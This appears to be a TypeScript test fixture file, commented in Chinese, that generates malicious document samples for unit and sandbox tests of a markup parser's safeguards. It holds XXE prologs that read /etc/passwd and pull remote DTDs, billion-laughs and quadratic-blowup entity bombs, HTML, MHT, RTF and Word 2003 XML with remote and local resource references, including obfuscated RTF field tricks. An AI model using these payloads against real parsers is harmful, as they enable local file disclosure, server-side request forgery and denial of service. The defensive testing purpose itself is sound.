// 文本类格式（6.7）的恶意样本：XXE、实体膨胀、XInclude、引用远程 / 本地资源的 HTML、MHT、RTF、Word 2003 XML。
// 远程地址都指向 base（沙箱测试中是沙箱内 127.0.0.1 上的监听端口，任何连接都会被记录），本地文件指向 /etc/passwd。
// 单元测试（tests/sandbox/markupGuard.test.ts）与沙箱测试（tests/sandbox/docker/parseMarkup.test.ts）共用。
import { readFileSync } from 'node:fs';

/** 1×1 的 PNG。 */
export const PNG_1PX = Buffer.from('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8/58BAAX+Av6n1qTmAAAAAElFTkSuQmCC', 'base64');
/** /etc/passwd 第一行的特征（出现在解析结果中即说明读到了本地文件）。 */
export const PASSWD_MARKER = 'root:x:0:0';

const samples = new URL('../files/samples/', import.meta.url);
export const markupSample = (name: string): Buffer => readFileSync(new URL(name, samples));

// ---------------------------------------------------------------- Office 2003 XML

const WORD_XML_ROOT = '<w:wordDocument xmlns:w="http://schemas.microsoft.com/office/word/2003/wordml">';

/** 最小的 Word 2003 XML：正文一段（text 原样放进 <w:t>，可含实体引用）。 */
export function wordXml(text: string, options: { prolog?: string; declaration?: string } = {}): Buffer {
  return Buffer.from(
    `${options.declaration ?? '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'}\n${options.prolog ?? ''}<?mso-application progid="Word.Document"?>\n` +
      `${WORD_XML_ROOT}<w:body><w:p><w:r><w:t>${text}</w:t></w:r></w:p></w:body></w:wordDocument>\n`,
    'utf8',
  );
}

/** 最小的 SpreadsheetML：一个工作表，第一行两格（cell 原样放进 <Data>，可含实体引用）。 */
export function spreadsheetXml(cell: string, options: { prolog?: string; declaration?: string } = {}): Buffer {
  return Buffer.from(
    `${options.declaration ?? '<?xml version="1.0" encoding="UTF-8"?>'}\n${options.prolog ?? ''}<?mso-application progid="Excel.Sheet"?>\n` +
      '<Workbook xmlns="urn:schemas-microsoft-com:office:spreadsheet" xmlns:ss="urn:schemas-microsoft-com:office:spreadsheet">' +
      '<Worksheet ss:Name="清单"><Table><Row>' +
      `<Cell><Data ss:Type="String">名称</Data></Cell><Cell><Data ss:Type="String">${cell}</Data></Cell>` +
      '</Row></Table></Worksheet></Workbook>\n',
    'utf8',
  );
}

/** 外部实体：读取本地文件与请求远程地址（含参数实体）。 */
export function xxeProlog(base: string, root: string): string {
  return (
    `<!DOCTYPE ${root} [\n` +
    '  <!ENTITY local SYSTEM "file:///etc/passwd">\n' +
    `  <!ENTITY remote SYSTEM "${base}/xxe-entity">\n` +
    `  <!ENTITY % param SYSTEM "${base}/xxe-param.dtd">\n` +
    '  %param;\n' +
    ']>\n'
  );
}

/** 实体递归膨胀（billion laughs）：10 层，每层 10 倍，展开后约 3 GB。 */
export function billionLaughsProlog(root: string): string {
  const lines = ['  <!ENTITY lol0 "lollollollollollollollollollollollollol">'];
  for (let level = 1; level <= 9; level += 1) lines.push(`  <!ENTITY lol${level} "${`&lol${level - 1};`.repeat(10)}">`);
  return `<!DOCTYPE ${root} [\n${lines.join('\n')}\n]>\n`;
}

/** 二次膨胀（quadratic blowup）：一个大实体被引用很多次，不需要嵌套。 */
export function quadraticBlowupProlog(root: string): string {
  return `<!DOCTYPE ${root} [<!ENTITY big "${'A'.repeat(50_000)}">]>\n`;
}

// ---------------------------------------------------------------- HTML / MHT / RTF / Word 2003 XML 中的远程资源

/** 引用各种远程与本地资源的 HTML；正文有“远程资源样本开始 / 结束”和一张内嵌（data:）图片。 */
export function remoteHtml(base: string): string {
  const png = PNG_1PX.toString('base64');
  return `<!DOCTYPE html>
<html><head><meta charset="utf-8"><title>远程资源样本</title>
<base href="${base}/base/">
<link rel="stylesheet" href="${base}/style.css"><link rel="icon" href="${base}/favicon.ico"><link rel="preload" href="${base}/preload">
<meta http-equiv="refresh" content="0;url=${base}/refresh">
<style>@import url("${base}/import.css"); body { background: url(${base}/background.png) } p { list-style-image: url('${base}/bullet.png') }</style>
<script src="${base}/script.js"></script><script>fetch('${base}/fetch')</script>
</head>
<body background="${base}/body-background.png">
<p style="background-image:url(${base}/inline-style.png)">远程资源样本开始</p>
<img src="${base}/image.png"><img src="relative.png"><img src="//127.0.0.1/protocol-relative.png"><img src="file:///etc/passwd">
<img src="data:image/png;base64,${png}" srcset="${base}/srcset.png 2x" alt="内嵌图片">
<img src="data:image/svg+xml;base64,${Buffer.from(`<svg xmlns="http://www.w3.org/2000/svg"><image href="${base}/svg-in-data.png"/></svg>`).toString('base64')}">
<iframe src="${base}/frame.html"></iframe><iframe src="file:///etc/passwd"></iframe><iframe srcdoc="&lt;img src='${base}/srcdoc.png'&gt;"></iframe>
<frameset><frame src="${base}/frame2.html"></frameset>
<object data="${base}/object.bin"></object><embed src="${base}/embed.swf"><applet code="A" codebase="${base}/applet/"></applet>
<video poster="${base}/poster.png"><source src="${base}/video.mp4"></video><audio src="${base}/audio.mp3"></audio>
<svg><image href="${base}/svg-image.png"/><use href="${base}/sprite.svg#x"/></svg>
<input type="image" src="${base}/input.png"><form action="${base}/form"><button formaction="${base}/button">b</button></form>
<table background="${base}/table-background.png"><tr><td background="${base}/cell-background.png">表格单元格</td></tr></table>
<a href="${base}/link">外部链接</a> <a href="javascript:alert(1)">脚本链接</a> <a href="file:///etc/passwd">本地链接</a>
<!--[if gte vml 1]><v:shape><v:imagedata src="${base}/vml.png"/></v:shape><![endif]-->
<o:p>${'Word 段落标记'}</o:p>
<p>远程资源样本结束</p>
</body></html>
`;
}

/** 只有远程表格背景、外链图片的 HTML 表格（.xls）。 */
export function remoteSheetHtml(base: string): string {
  return `<!DOCTYPE html><html><head><meta charset="utf-8"><link rel="stylesheet" href="${base}/sheet.css"></head>
<body><table><tr><td>名称</td><td>数量</td></tr><tr><td background="${base}/cell.png">服务器<img src="${base}/sheet-image.png"></td><td>2</td></tr></table></body></html>
`;
}

export interface MimePart {
  headers: Record<string, string>;
  body: string | Buffer;
}

/** 生成 MIME 消息（MHT）。boundary 与换行可指定，用来构造边界情况。 */
export function mimeMessage(parts: readonly MimePart[], options: { boundary?: string; newline?: string; topHeaders?: Record<string, string>; closing?: boolean; preamble?: string } = {}): Buffer {
  const boundary = options.boundary ?? '----=_NextPart_ZHIBIAO';
  const nl = options.newline ?? '\r\n';
  const top = options.topHeaders ?? { 'MIME-Version': '1.0', 'Content-Type': `multipart/related; boundary="${boundary}"; type="text/html"` };
  const chunks: Buffer[] = [Buffer.from(`${Object.entries(top).map(([name, value]) => `${name}: ${value}`).join(nl)}${nl}${nl}${options.preamble ?? '此文档为“单个文件网页”。'}${nl}`, 'latin1')];
  for (const part of parts) {
    chunks.push(Buffer.from(`${nl}--${boundary}${nl}${Object.entries(part.headers).map(([name, value]) => `${name}: ${value}`).join(nl)}${nl}${nl}`, 'latin1'));
    chunks.push(typeof part.body === 'string' ? Buffer.from(part.body, 'latin1') : part.body);
  }
  if (options.closing !== false) chunks.push(Buffer.from(`${nl}--${boundary}--${nl}`, 'latin1'));
  return Buffer.concat(chunks);
}

export function base64Lines(data: Buffer | string): string {
  return (typeof data === 'string' ? Buffer.from(data, 'utf8') : data).toString('base64').replace(/.{76}/g, '$&\r\n');
}

/**
 * MHT：正文 HTML 引用包内图片（相对 Content-Location、cid:、指向远程地址但包内已有的 Content-Location）和包外地址；
 * 另有 message/external-body（指向外部的部分）、远程样式表。只有包内的三张图片应被采用。
 */
export function remoteMht(base: string): Buffer {
  const html = `<html><head><link rel="stylesheet" href="${base}/mht.css"></head><body>
<p>MHT 正文开始</p>
<img src="word_files/image001.png"><img src="cid:image002@zhibiao"><img src="${base}/in-package.png">
<img src="${base}/not-in-package.png"><img src="word_files/missing.png"><img src="file:///etc/passwd">
<iframe src="${base}/mht-frame.html"></iframe>
<p>MHT 正文结束</p></body></html>`;
  const png = base64Lines(PNG_1PX);
  return mimeMessage([
    { headers: { 'Content-Location': 'file:///C:/0A1B2C3D/word.htm', 'Content-Transfer-Encoding': 'base64', 'Content-Type': 'text/html; charset="utf-8"' }, body: base64Lines(html) },
    { headers: { 'Content-Location': 'file:///C:/0A1B2C3D/word_files/image001.png', 'Content-Transfer-Encoding': 'base64', 'Content-Type': 'image/png' }, body: png },
    { headers: { 'Content-ID': '<image002@zhibiao>', 'Content-Transfer-Encoding': 'base64', 'Content-Type': 'image/png' }, body: png },
    { headers: { 'Content-Location': `${base}/in-package.png`, 'Content-Transfer-Encoding': 'base64', 'Content-Type': 'image/png' }, body: png },
    { headers: { 'Content-Type': `message/external-body; access-type=URL; URL="${base}/external-body"` }, body: `Content-Type: image/png\r\n\r\n` },
    { headers: { 'Content-Location': `${base}/remote.css`, 'Content-Type': 'text/css' }, body: `@import url(${base}/css-import.css);` },
  ]);
}

/** RTF 中的非 ASCII 文字写成 \\uN?（RTF 的正文按 ANSI 代码页读，不能直接写 UTF-8）。 */
export function rtfText(text: string): string {
  return [...text].map((char) => {
    const code = char.charCodeAt(0);
    return code < 0x80 ? char : `\\u${code > 0x7fff ? code - 0x10000 : code}?`;
  }).join('');
}

/** RTF：INCLUDETEXT 读本地文件、INCLUDEPICTURE / INCLUDETEXT 请求远程地址（含分组拆写、十六进制转义）、链接的 OLE 对象、链接图片的形状属性、附加模板。 */
export function remoteRtf(base: string): Buffer {
  return Buffer.from(
    `{\\rtf1\\ansi\\deff0{\\fonttbl{\\f0 Arial;}}{\\*\\template ${base}/template.dot}
\\pard RTF ${rtfText('远程样本开始')}\\par
{\\field{\\*\\fldinst { INCLUDETEXT "/etc/passwd" }}{\\fldrslt {${rtfText('缓存的本地文件结果')}}}}\\par
{\\field{\\*\\fldinst { INCLUDEPICTURE "${base}/rtf-picture.png" \\\\d }}{\\fldrslt {}}}\\par
{\\field{\\*\\fldinst {INCLUDE}{TEXT "${base}/rtf-text.txt"}}{\\fldrslt {${rtfText('缓存的远程结果')}}}}\\par
{\\field{\\*\\fldinst { INCLUDE\\'50ICTURE "${base}/rtf-hex.png" \\\\d }}{\\fldrslt {${rtfText('缓存的转义结果')}}}}\\par
{\\field{\\b\\fldinst { INCLUDETEXT "${base}/rtf-not-first.txt" }}{\\fldrslt {${rtfText('缓存的非首位结果')}}}}\\par
{\\field{\\*\\fldinst { LINK Word.Document.8 "${base}/rtf-link.doc" "" \\\\a }}{\\fldrslt {${rtfText('缓存的链接结果')}}}}\\par
{\\object\\objautlink\\rsltpict\\objw100\\objh100{\\*\\objclass Word.Document.8}{\\*\\objdata 0105}{\\*\\objlink ${base}/rtf-objlink}{\\result {OLE ${rtfText('对象的显示结果')}}}}\\par
{\\shp{\\*\\shpinst{\\sp{\\sn pibName}{\\sv ${base}/rtf-pib.png}}{\\sp{\\sn pibFlags}{\\sv 10}}{\\sp{\\sn shapeType}{\\sv 75}}}}\\par
{\\*\\shppict{\\pict{\\*\\picprop{\\sp{\\sn pibName}{\\sv ${base}/rtf-picprop.png}}}\\pngblip ${PNG_1PX.toString('hex')}}}\\par
RTF ${rtfText('远程样本结束')}\\par}
`,
    'utf8',
  );
}

/** Word 2003 XML：VML 图片、INCLUDEPICTURE / INCLUDETEXT 域、超链接都指向外部（没有 DTD，能通过检查，交给 LibreOffice）。 */
export function remoteWordXml(base: string): Buffer {
  return Buffer.from(
    `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<?mso-application progid="Word.Document"?>
<w:wordDocument xmlns:w="http://schemas.microsoft.com/office/word/2003/wordml" xmlns:v="urn:schemas-microsoft-com:vml" xmlns:o="urn:schemas-microsoft-com:office:office"><w:body>
<w:p><w:r><w:t>Word XML 远程样本开始</w:t></w:r></w:p>
<w:p><w:r><w:pict><v:shape style="width:10pt;height:10pt"><v:imagedata src="${base}/wordxml-imagedata.png" o:title=""/></v:shape></w:pict></w:r></w:p>
<w:p><w:fldSimple w:instr="INCLUDEPICTURE &quot;${base}/wordxml-field.png&quot; \\d"><w:r><w:t>图片域</w:t></w:r></w:fldSimple></w:p>
<w:p><w:r><w:fldChar w:fldCharType="begin"/></w:r><w:r><w:instrText>INCLUDETEXT "/etc/passwd"</w:instrText></w:r><w:r><w:fldChar w:fldCharType="separate"/></w:r><w:r><w:t>缓存结果</w:t></w:r><w:r><w:fldChar w:fldCharType="end"/></w:r></w:p>
<w:p><w:hlink w:dest="${base}/wordxml-link"><w:r><w:t>链接</w:t></w:r></w:hlink></w:p>
<w:p><w:r><w:t>Word XML 远程样本结束</w:t></w:r></w:p>
</w:body></w:wordDocument>
`,
    'utf8',
  );
}
